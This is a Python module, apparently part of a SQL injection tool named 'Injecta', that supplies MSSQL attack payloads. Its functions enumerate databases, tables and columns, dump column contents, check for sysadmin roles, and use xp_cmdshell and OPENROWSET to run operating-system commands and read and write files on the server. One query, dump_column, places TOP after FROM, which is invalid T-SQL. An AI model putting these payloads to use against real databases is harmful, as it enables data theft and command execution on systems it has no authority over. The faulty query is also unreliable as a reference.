"""
Injecta — MSSQL payload provider
"""
from typing import List


class MSSQLPayloads:
    name = "mssql"
    comment = "-- "
    inline_comment = "/*!*/"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT @@version",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT name FROM master..sysdatabases",
            "SELECT database_id, name FROM sys.databases",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            f"SELECT table_name FROM {db}.information_schema.tables",
            f"SELECT name FROM {db}..sysobjects WHERE xtype='U'",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT column_name FROM {db}.information_schema.columns WHERE table_name='{table}'",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {db}..{table}"
        if limit > 0:
            q += f" TOP {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT SYSTEM_USER", "SELECT CURRENT_USER"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT DB_NAME()"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}.information_schema.tables"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}.information_schema.columns WHERE table_name='{table}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}..{table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT @@version"]

    @staticmethod
    def is_sysadmin() -> List[str]:
        return ["SELECT IS_SRVROLEMEMBER('sysadmin')"]

    @staticmethod
    def is_admin() -> List[str]:
        return [
            "SELECT IS_SRVROLEMEMBER('sysadmin')",
            "SELECT IS_SRVROLEMEMBER('serveradmin')",
            "SELECT IS_SRVROLEMEMBER('securityadmin')",
        ]

    @staticmethod
    def privileges() -> List[str]:
        return [
            "SELECT r.name AS role, p.name AS principal FROM sys.server_role_members m JOIN sys.server_principals r ON m.role_principal_id=r.principal_id JOIN sys.server_principals p ON m.member_principal_id=p.principal_id WHERE p.name=SYSTEM_USER",
            "SELECT permission_name, state_desc FROM sys.server_permissions WHERE grantee_principal_id=SUSER_ID(SYSTEM_USER)",
        ]

    @staticmethod
    def xp_cmdshell(cmd: str) -> List[str]:
        return [f"EXEC master..xp_cmdshell '{cmd}'"]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT * FROM OPENROWSET(BULK N'{path}', SINGLE_CLOB) AS data",
            f"EXEC master..xp_cmdshell 'type {path}'",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        return [
            f"EXEC master..xp_cmdshell 'echo {content} > {path}'",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"EXEC master..xp_cmdshell '{cmd}'",
        ]
